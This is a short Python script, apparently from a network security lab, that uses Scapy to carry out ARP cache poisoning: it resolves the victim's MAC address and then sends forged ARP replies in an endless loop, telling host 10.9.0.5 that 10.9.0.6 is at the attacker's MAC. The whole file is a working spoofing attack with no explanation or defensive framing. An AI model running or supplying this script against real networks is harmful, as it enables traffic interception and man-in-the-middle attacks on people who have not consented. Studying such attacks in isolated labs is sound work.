#!/usr/bin/env python3
from scapy.all import *
import time

# Settings
interface = "eth0"
victim_ip = "10.9.0.5"    # Host A
target_ip = "10.9.0.6"    # Host B

# Get attacker's MAC address
attacker_mac = get_if_hwaddr(interface)

# Step 1: Find victim's real MAC address
victim_mac = getmacbyip(victim_ip)

if victim_mac is None:
    print(f"[-] Could not find MAC address for {victim_ip}")
    exit(1)

print(f"[+] Victim MAC address: {victim_mac}")

# Step 2: Craft ARP reply
arp_reply = ARP(
    op=2,                  # ARP reply
    psrc=target_ip,         # I am 10.9.0.6
    hwsrc=attacker_mac,     # My MAC
    pdst=victim_ip,         # Tell 10.9.0.5
    hwdst=victim_mac        # Send directly to victim's MAC
)

# Step 3: Send ARP reply multiple times
while True:
    send(arp_reply, iface=interface, verbose=False)
    print(f"[*] Sent ARP reply: {target_ip} is at {attacker_mac} to {victim_ip}")
    time.sleep(2)
